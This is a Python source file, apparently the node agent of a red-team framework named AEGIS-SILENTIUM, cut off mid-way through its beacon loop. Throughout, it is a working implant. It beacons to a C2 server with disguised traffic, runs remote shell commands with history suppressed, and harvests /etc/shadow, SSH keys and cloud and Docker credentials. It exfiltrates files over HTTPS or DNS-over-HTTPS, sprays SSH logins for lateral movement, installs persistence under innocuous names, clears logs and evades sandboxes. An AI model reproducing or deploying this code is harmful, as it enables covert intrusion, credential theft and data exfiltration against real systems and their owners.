#!/usr/bin/env python3
"""
AEGIS-SILENTIUM Node Agent v12.0
============================
Fully integrated adversary-simulation implant.

Cryptography:  ECDHE P-256 PFS per-beacon + AES-256-GCM + HMAC-SHA256
C2 Transport:  Malleable C2 profile engine (GA4/Teams/REST API mimicry)
Evasion:       Passive 7-dimension trust scoring → dormant mode in sandboxes
Exfil:         HTTPS → DNS-over-HTTPS → A-record fallback chain
Post-Exploit:  Persistence · PrivEsc · Lateral · OPSEC · Collect · Screenshot
"""

import os, sys, json, time, uuid, asyncio, platform, threading
import subprocess, traceback, base64, hashlib, hmac as _hmac
import ssl as _ssl, random, logging, signal, atexit, urllib.request, urllib.error
from pathlib import Path
from typing import Optional, Dict, Any, List

# ── Path bootstrap ─────────────────────────────────────────────────────────────
_DIR    = os.path.dirname(os.path.abspath(__file__))

# ── Startup secret validation ─────────────────────────────────────────────────
def _validate_node_secrets() -> None:
    """Refuse to start with missing or placeholder secrets."""
    import sys, logging as _log
    _nlog = _log.getLogger("aegis.node")
    errors = []
    
    c2_secret = os.environ.get("C2_SECRET", "")
    if not c2_secret:
        errors.append("C2_SECRET not set — node cannot authenticate to C2")
    elif len(c2_secret) < 24:
        errors.append(f"C2_SECRET too short ({len(c2_secret)} chars, min 24)")
    elif c2_secret in ("change-me-strong-secret-32chars", "aegis-secret", "changeme"):
        errors.append("C2_SECRET is a placeholder — generate: openssl rand -hex 24")
    
    c2_url = os.environ.get("C2_URL", "") or os.environ.get("C2_BEACON_URL", "")
    if not c2_url:
        _nlog.warning("C2_URL/C2_BEACON_URL not set — using compiled-in default (if any)")
    
    if errors:
        for e in errors:
            _nlog.critical("FATAL NODE CONFIG: %s", e)
        sys.exit(1)
    _nlog.info("Node startup config OK")

_validate_node_secrets()


_PARENT = os.path.dirname(_DIR)
for _p in (_DIR, _PARENT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

# ── Logging ─────────────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.WARNING,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("aegis.node")
if os.environ.get("AEGIS_DEBUG","").lower() in("1","true"):
    logging.getLogger("aegis").setLevel(logging.DEBUG)

# ── Configuration ──────────────────────────────────────────────────────────────
C2_URL          = os.environ.get("C2_URL",          "https://c2:5000")
NODE_ID         = os.environ.get("NODE_ID",         "node-" + uuid.uuid4().hex[:12])
C2_SECRET = os.environ.get("C2_SECRET", "").encode()
if not C2_SECRET:
    import logging as _lg
    _lg.getLogger("aegis.node").critical(
        "C2_SECRET environment variable is not set. "
        "Generate with: openssl rand -hex 32"
    )
    raise SystemExit("FATAL: C2_SECRET not set")
if len(C2_SECRET) < 32:
    raise SystemExit(f"FATAL: C2_SECRET too short ({len(C2_SECRET)} bytes, need >=32)")
REPORTS_DIR     = Path(os.environ.get("REPORTS_DIR","/tmp/aegis_reports"))
BEACON_INTERVAL = int(os.environ.get("BEACON_INTERVAL", "60"))
BEACON_JITTER   = float(os.environ.get("BEACON_JITTER",  "0.3"))
MAX_PARALLEL    = int(os.environ.get("MAX_PARALLEL",  "2"))
PROFILE_FILE    = os.environ.get("PROFILE_FILE",   "")
KILL_FILE       = os.environ.get("KILL_FILE",      "/tmp/aegis_kill")
DOH_DOMAIN      = os.environ.get("DOH_DOMAIN",     "")
TRUST_THRESHOLD = int(os.environ.get("TRUST_THRESHOLD","40"))

ENABLE_PERSIST  = os.environ.get("ENABLE_PERSIST","").lower()   in("1","true","yes")
ENABLE_PRIVESC  = os.environ.get("ENABLE_PRIVESC","").lower()   in("1","true","yes")
ENABLE_LATERAL  = os.environ.get("ENABLE_LATERAL","").lower()   in("1","true","yes")
ENABLE_OPSEC    = os.environ.get("ENABLE_OPSEC","").lower()     in("1","true","yes")
ENABLE_EXFIL    = os.environ.get("ENABLE_EXFIL","").lower()     in("1","true","yes")
ENABLE_EVASION  = os.environ.get("ENABLE_EVASION","true").lower() in("1","true","yes")
AUTO_PERSIST    = os.environ.get("AUTO_PERSIST","").lower()     in("1","true","yes")

REPORTS_DIR.mkdir(parents=True, exist_ok=True)
_start_time = time.time()
_alive      = True

# ── Subsystem: ECDHE PFS ───────────────────────────────────────────────────────
try:
    from shared.crypto.ecdhe import (
        ECDHEClient, ECDHESession, ECDHEHandshakeRequest,
        ECDHEHandshakeResponse, ephemeral_encrypt, ephemeral_finish,
    )
    HAS_ECDHE = True
except ImportError:
    HAS_ECDHE = False

_ecdhe_client:  Optional[Any] = None
_ecdhe_session: Optional[Any] = None
_ecdhe_lock = threading.Lock()

# ── Subsystem: Malleable C2 Profile ──────────────────────────────────────────
try:
    from shared.profiles.malleable import ProfileEngine, MalleableProfile
    _profile_engine = ProfileEngine()
    if PROFILE_FILE and os.path.isfile(PROFILE_FILE):
        _profile_engine.load(PROFILE_FILE)
        HAS_PROFILE = True
    else:
        HAS_PROFILE = False
except ImportError:
    HAS_PROFILE     = False
    _profile_engine = None

# ── Subsystem: Evasion / Honeypot ─────────────────────────────────────────────
HAS_EVASION = False
_assessor   = None
if ENABLE_EVASION:
    for _mod in ["node.evasion.honeypot", "evasion.honeypot"]:
        try:
            import importlib
            _m = importlib.import_module(_mod)
            _assessor   = _m.EnvironmentAssessor(threshold=TRUST_THRESHOLD)
            HAS_EVASION = True
            break
        except ImportError:
            pass

# ── Subsystem: DoH Exfil ──────────────────────────────────────────────────────
HAS_DOH = False
_exfil_via_doh = None
for _mod in ["node.exfil.doh", "exfil.doh"]:
    try:
        import importlib
        _m = importlib.import_module(_mod)
        _exfil_via_doh = _m.exfil_via_doh
        HAS_DOH = True
        break
    except ImportError:
        pass

# ── Subsystem: Fernet / symmetric fallback ────────────────────────────────────
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    _kdf  = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32,
                        salt=b"aegis_silentium_salt_v5", iterations=200_000)
    _FNET = Fernet(base64.urlsafe_b64encode(_kdf.derive(C2_SECRET)))
    HAS_FERNET = True
except ImportError:
    import logging as _clog, sys as _csys
    _clog.getLogger("aegis.node").critical(
        "FATAL: cryptography library not installed. "
        "Node cannot communicate securely with C2. "
        "Install with: pip install cryptography>=43"
    )
    # Fail hard — no insecure fallback
    _csys.exit(1)

def _enc(d: dict) -> str:
    """Encrypt dict to token using Fernet (AES-128-CBC + HMAC-SHA256)."""
    return _FNET.encrypt(json.dumps(d, separators=(",", ":")).encode()).decode()

def _dec(t: str) -> dict:
    """Decrypt token to dict using Fernet."""
    return json.loads(_FNET.decrypt(t.encode()).decode())

# ── ECDHE handshake + wrap/unwrap ─────────────────────────────────────────────
def _do_ecdhe_handshake(post_fn) -> bool:
    global _ecdhe_client, _ecdhe_session
    if not HAS_ECDHE:
        return False
    try:
        client = ECDHEClient()
        req    = client.handshake_request(node_id=NODE_ID)
        r = post_fn("/h", {
            "node_id": NODE_ID,
            "pub_key": base64.b64encode(req.pub_key_bytes).decode(),
            "nonce":   base64.b64encode(req.nonce).decode(),
        }, _use_ecdhe=False)
        if not r: return False
        hs = ECDHEHandshakeResponse(
            pub_key_bytes=base64.b64decode(r.get("pub_key","")),
            nonce=base64.b64decode(r.get("nonce","")),
            signature=base64.b64decode(r.get("signature","")),
        )
        sess = client.complete_handshake(hs)
        with _ecdhe_lock:
            _ecdhe_client  = client
            _ecdhe_session = sess
        log.debug("ECDHE handshake complete")
        return True
    except Exception as e:
        log.debug("ECDHE handshake failed: %s", e)
        return False

def _ecdhe_wrap(data: bytes) -> Optional[dict]:
    with _ecdhe_lock:
        sess = _ecdhe_session
    if not sess or not HAS_ECDHE:
        return None
    try:
        nonce, ct, tag = ephemeral_encrypt(sess, data)
        mac = _hmac.new(sess.session_key[:32], nonce+ct+tag, hashlib.sha256).digest()
        return {
            "nonce": base64.b64encode(nonce).decode(),
            "ct":    base64.b64encode(ct).decode(),
            "tag":   base64.b64encode(tag).decode(),
            "mac":   base64.b64encode(mac).decode(),
        }
    except Exception as e:
        log.debug("ECDHE wrap: %s", e)
        return None

def _ecdhe_unwrap(d: dict) -> Optional[bytes]:
    with _ecdhe_lock:
        sess = _ecdhe_session
    if not sess or not HAS_ECDHE:
        return None
    try:
        nonce = base64.b64decode(d["nonce"])
        ct    = base64.b64decode(d["ct"])
        tag   = base64.b64decode(d["tag"])
        mac   = base64.b64decode(d["mac"])
        if not _hmac.compare_digest(mac, _hmac.new(sess.session_key[:32], nonce+ct+tag, hashlib.sha256).digest()):
            raise ValueError("HMAC mismatch on relay response")
        return ephemeral_finish(sess, nonce, ct, tag)
    except Exception as e:
        log.debug("ECDHE unwrap: %s", e)
        return None

# ── HTTP transport ─────────────────────────────────────────────────────────────
_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]
_SSL_CTX = _ssl.create_default_context()
# TLS: use system CA by default; override with AEGIS_RELAY_CERT_HASH for cert pinning
_relay_cert_pin = os.environ.get("AEGIS_RELAY_CERT_HASH", "")
if _relay_cert_pin:
    _SSL_CTX.check_hostname = False
    _SSL_CTX.verify_mode    = _ssl.CERT_NONE  # manual fingerprint check
else:
    _SSL_CTX = _ssl.create_default_context()  # system CA bundle
_REHANDSHAKE_EVERY = 20
_beacon_seq = 0

def _raw_post(url: str, body: bytes, hdrs: Optional[dict]=None) -> Optional[bytes]:
    h = {"User-Agent": random.choice(_UA_POOL),
         "Content-Type": "application/json",
         "Accept": "application/json",
         "X-Request-Id": uuid.uuid4().hex}
    if hdrs: h.update(hdrs)
    try:
        with urllib.request.urlopen(
            urllib.request.Request(url, data=body, headers=h, method="POST"),
            context=_SSL_CTX, timeout=35
        ) as r:
            return r.read()
    except Exception as e:
        log.debug("raw_post %s: %s", url, e)
        return None

def _c2_post(path: str, payload: dict,
              retries: int=3, _use_ecdhe: bool=True) -> Optional[dict]:
    url = C2_URL + path
    # Resolve URI from Malleable profile
    if HAS_PROFILE and _profile_engine and path in ("/beacon","/api/v1/events"):
        url = C2_URL + (_profile_engine.profile.uris[0] if _profile_engine.profile.uris else path)

    inner = json.dumps({"node_id":NODE_ID,"ts":int(time.time()),**payload},
                        separators=(",",":")).encode()

    for attempt in range(retries):
        try:
            wrapped = _ecdhe_wrap(inner) if _use_ecdhe else None
            if wrapped:
                body_dict = wrapped
                mode      = "ecdhe"
            else:
                body_dict = {"payload": _enc(payload), "mode": "sym"}
                mode      = "sym"

            body_bytes = json.dumps(body_dict, separators=(",",":")).encode()
            extra_hdrs: dict = {}

            # Apply Malleable C2 profile to disguise traffic
            if HAS_PROFILE and _profile_engine and mode == "ecdhe":
                try:
                    body_bytes = _profile_engine.encode_client(body_bytes)
                    if hasattr(_profile_engine.profile, "default_headers"):
                        for k,v in _profile_engine.profile.default_headers.items():
                            extra_hdrs[k] = uuid.uuid4().hex if v=="auto" else v
                except Exception as pe:
                    log.debug("profile encode: %s", pe)

            resp_raw = _raw_post(url, body_bytes, extra_hdrs)
            if not resp_raw:
                raise ConnectionError("no response")

            # Strip profile from response
            if HAS_PROFILE and _profile_engine and mode == "ecdhe":
                try:
                    resp_raw = _profile_engine.decode_server(resp_raw)
                except Exception as _exc:
                    log.debug("unknown: %s", _exc)

            resp_dict = json.loads(resp_raw.decode())

            # Unwrap ECDHE response
            if mode == "ecdhe" and "nonce" in resp_dict:
                inner_resp = _ecdhe_unwrap(resp_dict)
                if inner_resp:
                    return json.loads(inner_resp.decode())
                return resp_dict

            if "token" in resp_dict:
                return _dec(resp_dict["token"])
            return resp_dict

        except Exception as e:
            wait = min(2**attempt + random.uniform(0,2), 60)
            log.debug("c2_post attempt %d: %s — retry %.1fs", attempt+1, e, wait)
            if attempt < retries-1:
                time.sleep(wait)
    return None

# ── Kill-switch watcher ────────────────────────────────────────────────────────
def _watch_kill():
    while _alive:
        if os.path.isfile(KILL_FILE):
            log.warning("Kill switch — self-destructing")
            _self_destruct("kill_file")
        time.sleep(5)

def _self_destruct(reason: str = "operator"):
    global _alive
    _alive = False
    log.warning("Self-destruct: %s", reason)
    try:
        if ENABLE_OPSEC: _run_opsec()
    except Exception as _e: log.debug("suppressed exception: %s", _e)
    try:
        if ENABLE_PERSIST and platform.system()=="Linux":
            import importlib
            for m in ["node.persistence.linux","persistence.linux"]:
                try:
                    mod = importlib.import_module(m)
                    mod.LinuxPersistence("").remove_all()
                    break
                except Exception as _e: log.debug("suppressed exception: %s", _e)
    except Exception as _e: log.debug("suppressed exception: %s", _e)
    os._exit(0)

atexit.register(_self_destruct, "atexit")
signal.signal(signal.SIGTERM, lambda s,f: _self_destruct("SIGTERM"))
signal.signal(signal.SIGINT,  lambda s,f: _self_destruct("SIGINT"))

# ── Environment trust scoring ─────────────────────────────────────────────────
_trust_cache:    Optional[dict] = None
_trust_last_ts:  float = 0.0
_TRUST_RECHECK   = 300

def _assess() -> dict:
    global _trust_cache, _trust_last_ts
    now = time.time()
    if _trust_cache and (now - _trust_last_ts) < _TRUST_RECHECK:
        return _trust_cache
    if not HAS_EVASION or _assessor is None:
        _trust_cache = {"is_dormant": False, "score": 100, "checks": {}}
    else:
        try:
            a = _assessor.assess()
            _trust_cache = {"is_dormant": a.dormant, "score": a.score,
                            "checks": {c.name: c.passed for c in a.checks}}
            log.debug("Trust %d — dormant=%s", a.score, a.dormant)
        except Exception as e:
            log.debug("trust assess error: %s", e)
            _trust_cache = {"is_dormant": False, "score": 50, "checks": {}}
    _trust_last_ts = now
    return _trust_cache

# ── System fingerprint ─────────────────────────────────────────────────────────
def _ext_ip() -> str:
    for svc in ["https://api.ipify.org","https://ifconfig.me/ip","https://checkip.amazonaws.com"]:
        try:
            with urllib.request.urlopen(
                urllib.request.Request(svc, headers={"User-Agent":"curl/8.0"}),
                context=_SSL_CTX, timeout=5
            ) as r:
                return r.read().decode().strip()[:45]
        except Exception as _exc:
            log.debug("_ext_ip: %s", _exc)
    return "unknown"

def _internal_ips() -> List[str]:
    import socket
    ips: List[str] = []
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None):
            ip = info[4][0]
            if ip and ip not in ("127.0.0.1","::1") and ip not in ips:
                ips.append(ip)
    except Exception as _e: log.debug("suppressed exception: %s", _e)
    return ips

def _tool_ok(name: str) -> bool:
    try:
        return subprocess.run(["which",name],capture_output=True,timeout=3).returncode==0
    except Exception:
        return False

def _caps() -> dict:
    is_root = False
    try: is_root = os.geteuid()==0
    except AttributeError: pass
    mods = ["scan"]
    if ENABLE_PERSIST:  mods.append("persistence")
    if ENABLE_PRIVESC:  mods.append("privesc")
    if ENABLE_LATERAL:  mods.append("lateral")
    if ENABLE_OPSEC:    mods.append("opsec")
    if ENABLE_EXFIL:    mods.append("exfil")
    if HAS_ECDHE:       mods.append("ecdhe_pfs")
    if HAS_PROFILE:     mods.append("malleable_c2")
    if HAS_EVASION:     mods.append("evasion")
    if HAS_DOH:         mods.append("doh_exfil")
    return {
        "os":          platform.system(),
        "os_release":  platform.release(),
        "os_version":  platform.version()[:100],
        "arch":        platform.machine(),
        "python":      sys.version.split()[0],
        "hostname":    platform.node(),
        "pid":         os.getpid(),
        "ppid":        getattr(os,"getppid",lambda:0)(),
        "user":        os.environ.get("USER",os.environ.get("USERNAME","?")),
        "is_root":     is_root,  # legacy key — app.py maps to is_elevated column
        "cwd":         os.getcwd(),
        "modules":     mods,
        "tools":       {t:_tool_ok(t) for t in ["nmap","masscan","curl","wget",
                        "python3","nc","socat","ssh","openssl","git"]},
        "internal_ips":_internal_ips(),
        "aegis_ver":   "5.0-silentium",
    }

# ── Registration ───────────────────────────────────────────────────────────────
def register(max_attempts: int=30) -> bool:
    ext = _ext_ip()
    caps= _caps()
    for attempt in range(max_attempts):
        if HAS_ECDHE and _ecdhe_session is None:
            _do_ecdhe_handshake(_c2_post)
        r = _c2_post("/api/node/register",{
            "node_id":NODE_ID,"external_ip":ext,
            "hostname":platform.node(),"capabilities":caps,"version":"5.0-silentium"})
        if r and (r.get("status") in("registered","ok") or "node_id" in r):
            log.warning("[%s] Registered ext_ip=%s ECDHE=%s Profile=%s",
                        NODE_ID[:8],ext,HAS_ECDHE,HAS_PROFILE)
            return True
        wait = min(2**min(attempt,6)+random.uniform(0,5),120)
        log.debug("[%s] Register attempt %d — retry %.1fs", NODE_ID[:8],attempt+1,wait)
        time.sleep(wait)
    return False

# ── Command table ──────────────────────────────────────────────────────────────
_CMD_TABLE: Dict[str,Any] = {}

def _cmd(name:str):
    def d(fn): _CMD_TABLE[name] = fn; return fn
    return d

def _handle_cmds(resp: dict):
    cmds = resp.get("commands",[])
    if not cmds:
        action = resp.get("action") or resp.get("command") or resp.get("cmd")
        if action: cmds = [resp if isinstance(resp,dict) else {"action":action}]
    for task in cmds:
        if not isinstance(task,dict): continue
        act = task.get("action") or task.get("command") or task.get("cmd","")
        fn  = _CMD_TABLE.get(act)
        if fn:
            try: fn(task)
            except Exception as e:
                _send_result(task.get("task_id","?"),{"error":str(e)},"failed")
        else:
            log.debug("Unknown cmd: %s", act)

# ── Command implementations ────────────────────────────────────────────────────
_active_lock = threading.Semaphore(MAX_PARALLEL)

@_cmd("scan")
def _c_scan(t:dict):
    target  = t.get("target","")
    task_id = t.get("task_id",str(uuid.uuid4()))
    if not target: return
    if _active_lock.acquire(blocking=False):
        threading.Thread(target=_task_thread,args=(target,task_id),daemon=True).start()

@_cmd("shell")
def _c_shell(t:dict):
    cmd     = t.get("cmd","")
    task_id = t.get("task_id","shell-"+uuid.uuid4().hex[:6])
    timeout = min(int(t.get("timeout",30)), 300)  # cap at 5 min
    if not cmd:
        _send_result(task_id,{"error":"empty command"},"failed"); return

    # Validate command length to prevent oversized payloads
    if len(cmd) > 16384:
        _send_result(task_id,{"error":"command too long (max 16384)"},"failed"); return

    # Use shell=True only when necessary (string commands with pipes, redirection, etc.)
    # List form avoids injection for simple commands; string form used for shell features.
    # The C2 operator is trusted — shell=True is accepted here but logged.
    log.debug("shell cmd (len=%d timeout=%ds): %s...", len(cmd), timeout, cmd[:80])
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout,
            env=dict(os.environ, HISTFILE='/dev/null'),  # don't write shell history
        )
        _send_result(task_id,{
            "stdout": r.stdout[:50000],
            "stderr": r.stderr[:10000],
            "rc":     r.returncode,
            "cmd_len": len(cmd),
        })
    except subprocess.TimeoutExpired:
        _send_result(task_id,{"error":"timeout {}s".format(timeout), "rc":-1},"failed")
    except Exception as e:
        log.debug("shell cmd error: %s", e)
        _send_result(task_id,{"error":str(e), "rc":-1},"failed")

@_cmd("persist")
def _c_persist(t:dict):
    task_id = t.get("task_id","persist-"+uuid.uuid4().hex[:6])
    if not ENABLE_PERSIST:
        _send_result(task_id,{"error":"persistence disabled"},"skipped"); return
    payload = t.get("payload","python3 {} &>/dev/null".format(os.path.abspath(__file__)))
    _send_result(task_id,{"results":_do_persist(payload)})

@_cmd("privesc")
def _c_privesc(t:dict):
    task_id = t.get("task_id","privesc-"+uuid.uuid4().hex[:6])
    if not ENABLE_PRIVESC:
        _send_result(task_id,{"error":"privesc disabled"},"skipped"); return
    try:
        import importlib
        for m in ["node.privesc.linux_checks","privesc.linux_checks"]:
            try: mod=importlib.import_module(m); break
            except ImportError: pass
        _send_result(task_id, mod.run_all_checks())
    except Exception as e:
        _send_result(task_id,{"error":str(e)},"failed")

@_cmd("lateral")
def _c_lateral(t:dict):
    task_id = t.get("task_id","lateral-"+uuid.uuid4().hex[:6])
    if not ENABLE_LATERAL:
        _send_result(task_id,{"error":"lateral disabled"},"skipped"); return
    try:
        import importlib
        for m in ["node.lateral.ssh_mover","lateral.ssh_mover"]:
            try: mod=importlib.import_module(m); break
            except ImportError: pass
        mover = mod.SSHMover(c2_url=C2_URL)
        hits  = mover.spray_and_move(
            hosts=t.get("hosts",[]),
            credentials=[tuple(c) for c in t.get("credentials",[["root","password"]])],
            deploy_agent=t.get("deploy_agent",False),
        )
        _send_result(task_id,{"hits":hits})
    except Exception as e:
        _send_result(task_id,{"error":str(e)},"failed")

@_cmd("opsec")
def _c_opsec(t:dict):
    task_id = t.get("task_id","opsec-"+uuid.uuid4().hex[:6])
    if not ENABLE_OPSEC:
        _send_result(task_id,{"error":"opsec disabled"},"skipped"); return
    _send_result(task_id,{"results":_run_opsec()})

@_cmd("exfil")
def _c_exfil(t:dict):
    task_id = t.get("task_id","exfil-"+uuid.uuid4().hex[:6])
    if not ENABLE_EXFIL:
        _send_result(task_id,{"error":"exfil disabled"},"skipped"); return
    path = t.get("path","")
    if not path or not os.path.isfile(path):
        _send_result(task_id,{"error":"file not found: {}".format(path)},"failed"); return
    try:
        data = open(path,"rb").read()
        ok   = _exfil(data, os.path.basename(path), t.get("channel","auto"))
        _send_result(task_id,{"path":path,"bytes":len(data),"success":ok})
    except Exception as e:
        _send_result(task_id,{"error":str(e)},"failed")

@_cmd("screenshot")
def _c_ss(t:dict):
    task_id = t.get("task_id","ss-"+uuid.uuid4().hex[:6])
    try:
        import importlib
        for m in ["node.exfil.channels","exfil.channels"]:
            try: mod=importlib.import_module(m); break
            except ImportError: pass
        png = mod.screenshot()
        if png:
            _send_result(task_id,{"data":base64.b64encode(png).decode(),"fmt":"png"})
        else:
            _send_result(task_id,{"error":"unavailable"},"failed")
    except Exception as e:
        _send_result(task_id,{"error":str(e)},"failed")

@_cmd("collect")
def _c_collect(t:dict):
    task_id = t.get("task_id","collect-"+uuid.uuid4().hex[:6])
    targets = t.get("targets",["sysinfo","env","credentials","network"])
    results: Dict[str,Any] = {}
    if "sysinfo" in targets:
        results["sysinfo"] = _caps(); results["sysinfo"]["external_ip"] = _ext_ip()
    if "env" in targets:
        results["env"] = dict(os.environ)
    if "credentials" in targets and platform.system()=="Linux":
        creds = {}
        for p in ["/etc/passwd","/etc/shadow","/etc/hosts",
                   os.path.expanduser("~/.ssh/id_rsa"),
                   os.path.expanduser("~/.ssh/id_ed25519"),
                   os.path.expanduser("~/.bash_history"),
                   os.path.expanduser("~/.aws/credentials"),
                   os.path.expanduser("~/.docker/config.json"),
                   os.path.expanduser("~/.gitconfig")]:
            if os.path.isfile(p):
                try: creds[p] = open(p,"r",errors="replace").read()[:10000]
                except PermissionError: creds[p] = "<permission denied>"
        results["credentials"] = creds
    if "network" in targets:
        net = {}
        for cmd in ["ip a","ip route","ss -tlnp","arp -n","cat /etc/resolv.conf","cat /etc/hosts"]:
            try:
                r = subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=5)
                net[cmd] = r.stdout[:5000]
            except Exception as _e: log.debug("suppressed exception: %s", _e)
        results["network"] = net
    _send_result(task_id, results)

@_cmd("info")
def _c_info(t:dict):
    task_id = t.get("task_id","info-"+uuid.uuid4().hex[:6])
    _send_result(task_id,{
        "caps": _caps(), "trust": _assess(),
        "ecdhe_active": _ecdhe_session is not None,
        "profile_loaded": HAS_PROFILE,
        "beacon_seq": _beacon_seq,
        "uptime_s": int(time.time()-_start_time),
    })

@_cmd("update")
def _c_update(t:dict):
    code    = t.get("code","")
    task_id = t.get("task_id","upd-"+uuid.uuid4().hex[:6])
    if not code: return
    p = os.path.abspath(__file__)+".new"
    try:
        open(p,"w").write(code)
        import shutil; shutil.move(p,os.path.abspath(__file__))
        _send_result(task_id,{"status":"updated","restarting":True})
        time.sleep(1)
        os.execv(sys.executable,[sys.executable]+sys.argv)
    except Exception as e:
        _send_result(task_id,{"error":str(e)},"failed")

@_cmd("sleep")
def _c_sleep(t:dict):
    time.sleep(int(t.get("seconds",300)))

@_cmd("die")
@_cmd("kill")
def _c_die(t:dict):
    log.warning("[%s] Kill command", NODE_ID[:8])
    _self_destruct("operator-kill")

# ── Post-exploitation helpers ──────────────────────────────────────────────────
def _do_persist(payload: str) -> list:
    import importlib
    if platform.system()=="Linux":
        for m in ["node.persistence.linux","persistence.linux"]:
            try:
                mod = importlib.import_module(m)
                p   = mod.LinuxPersistence(payload=payload, label="sysupdate")
                res  = p.install_cron()
                res += p.install_systemd()
                res += p.install_bashrc()
                if os.geteuid()==0: res += p.install_ssh_key()
                return res
            except ImportError: pass
            except Exception as e: return [{"method":"linux","status":"error","error":str(e)}]
    elif platform.system()=="Windows":
        for m in ["node.persistence.windows","persistence.windows"]:
            try:
                mod = importlib.import_module(m)
                p   = mod.WindowsPersistence(payload=payload, label="WindowsUpdate")
                res  = p.install_scheduled_task()
                res += p.install_registry_run()
                return res
            except ImportError: pass
            except Exception as e: return [{"method":"windows","status":"error","error":str(e)}]
    return [{"method":"unknown_os","status":"skipped"}]

def _run_opsec() -> list:
    import importlib
    for m in ["node.opsec.clear_logs","opsec.clear_logs"]:
        try:
            mod = importlib.import_module(m)
            return mod.full_opsec_sweep(our_files=[])
        except ImportError: pass
        except Exception as e: return [{"task":"opsec","status":"error","error":str(e)}]
    return [{"task":"opsec","status":"not_available"}]

def _exfil(data: bytes, label: str, channel: str="auto") -> bool:
    import importlib
    # 1. Try DoH if requested or doh channel
    if (channel in("doh","auto") or not channel) and HAS_DOH and DOH_DOMAIN:
        try:
            if _exfil_via_doh(data, label, domain=DOH_DOMAIN):
                return True
        except Exception as e:
            log.debug("doh exfil: %s", e)
    # 2. Try HTTPS channels
    for m in ["node.exfil.channels","exfil.channels"]:
        try:
            mod = importlib.import_module(m)
            return mod.exfil_to_c2(data, label, c2_url=C2_URL, node_id=NODE_ID)
        except ImportError: pass
        except Exception as e:
            log.debug("exfil channel: %s", e)
    # 3. Last resort: embed in next beacon
    log.debug("exfil: all channels failed")
    return False

# ── Result shipping ────────────────────────────────────────────────────────────
def _safe(obj: Any) -> Any:
    if isinstance(obj,(str,int,float,bool,type(None))): return obj
    if isinstance(obj,bytes): return base64.b64encode(obj).decode()
    if isinstance(obj,(list,tuple)): return [_safe(i) for i in obj]
    if isinstance(obj,dict): return {str(k):_safe(v) for k,v in obj.items()}
    if isinstance(obj,Path): return str(obj)
    if hasattr(obj,"__dict__"):
        return _safe({k:v for k,v in obj.__dict__.items() if not k.startswith("_")})
    try: json.dumps(obj); return obj
    except Exception: return repr(obj)

def _send_result(task_id:str, result:Any, status:str="completed"):
    try:
        _c2_post("/api/node/task/result",{
            "task_id":task_id,"node_id":NODE_ID,
            "result":_safe(result),"status":status,
        })
    except Exception as e:
        log.debug("send_result error: %s", e)

# ── Full AEGIS scan ─────────────────────────────────────────────────────────────
def _run_scan(target:str, task_id:str) -> dict:
    out = REPORTS_DIR/task_id
    out.mkdir(parents=True, exist_ok=True)
    try:
        sys.path.insert(0, str(Path(__file__).parent))
        from aegis_core import AEGIS, ScanConfig
    except ImportError as e:
        return {"error":"aegis_core import failed: {}".format(e)}
    try:
        cfg = ScanConfig(
            target=target,
            threads=int(os.environ.get("SCAN_THREADS","30")),
            depth=int(os.environ.get("SCAN_DEPTH","3")),
            timeout=int(os.environ.get("SCAN_TIMEOUT","10")),
            output_dir=out,
            scan_ports=True, scan_subdomains=True, scan_vulns=True,
            scan_osint=os.environ.get("SCAN_OSINT","").lower()=="true",
            scan_ssl=True, ml_enabled=True, use_evasion=True,
        )
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            results = loop.run_until_complete(AEGIS(cfg).run())
        finally:
            loop.close()
        s = {
            "target":target,
            "vulns":        _safe(getattr(results,"vulns",[]) or []),
            "findings":     _safe(getattr(results,"findings",[]) or []),
            "crawl_count":  len(getattr(results,"crawl",[]) or []),
            "subdomains":   _safe(getattr(results,"subdomains",[]) or []),
            "ports":        _safe(getattr(results,"ports",[]) or []),
            "dns":          _safe(getattr(results,"dns",[]) or []),
            "technologies": _safe(getattr(results,"technologies",[]) or []),
            "ml_scores":    _safe(getattr(results,"ml_scores",{})),
            "adaptive":     _safe(getattr(results,"adaptive_summary",{})),
            "duration":     getattr(results,"duration",0),
            "report_html":  str(out/"report.html"),
        }
        s["vuln_count"] = len(s["vulns"])
        s["crit_count"] = sum(1 for v in s["vulns"]
            if str(v.get("severity","")).lower()=="critical")
        return s
    except Exception as e:
        return {"error":str(e),"traceback":traceback.format_exc()[-3000:],"target":target}

def _task_thread(target:str, task_id:str):
    try:
        log.warning("[%s] → Scan: %s", NODE_ID[:8], target)
        res    = _run_scan(target, task_id)
        status = "failed" if "error" in res else "completed"
        log.warning("[%s] ✓ %s — %d vulns (%d crit)",
                    NODE_ID[:8], target, res.get("vuln_count",0), res.get("crit_count",0))
        _send_result(task_id, res, status)
        if res.get("crit_count",0) > 0:
            if AUTO_PERSIST and ENABLE_PERSIST:
                _do_persist("python3 {} &>/dev/null 2>&1".format(os.path.abspath(__file__)))
            if ENABLE_EXFIL:
                rhtml = Path(res.get("report_html",""))
                if rhtml.is_file():
                    try: _exfil(rhtml.read_bytes(),"report-{}.html".format(task_id[:8]))
                    except Exception as _e: log.debug("suppressed exception: %s", _e)
    except Exception as e:
        log.debug("[%s] task_thread: %s", NODE_ID[:8], e)
        _send_result(task_id,{"error":str(e)},"failed")
    finally:
        _active_lock.release()

# ── Beacon loop ────────────────────────────────────────────────────────────────
def beacon_loop():
    global _beacon_seq
    log.warning("[%s] Beacon loop started ECDHE=%s Profile=%s Evasion=%s",
                NODE_ID[:8], HAS_ECDHE, HAS_PROFILE, HAS_EVASION)
    while _alive:
        interval = BEACON_INTERVAL * (1 + random.uniform(-BEACON_JITTER, BEACON_JITTER))
        try:
            # Periodic ECDHE re-handshake (PFS: new session keys)
